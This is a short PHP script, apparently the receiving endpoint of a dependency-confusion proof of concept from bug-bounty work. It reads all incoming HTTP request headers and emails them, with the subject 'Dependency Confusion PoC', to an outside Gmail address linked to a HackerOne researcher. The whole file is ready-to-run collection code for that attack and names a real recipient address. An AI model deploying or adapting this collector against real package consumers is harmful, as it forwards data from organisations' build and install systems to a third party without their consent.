<?php

function getRequestHeaders() {
    $headers = array();
    foreach($_SERVER as $key => $value) {
        if (substr($key, 0, 5) <> 'HTTP_') {
            continue;
        }
        $header = str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))));
        $headers[$header] = $value;
    }
    return $headers;
}

$headers = getRequestHeaders();
$msg = '';
foreach ($headers as $header => $value) {
    $msg = $msg."$header: $value <br />\n";
}

$emailHeaders = "From: no-reply@kaspat.com\r\n";
$subject = "Dependency Confusion PoC";
$to = "codermak.hackerone@gmail.com";

mail($to, $subject, $msg, $emailHeaders);

?>
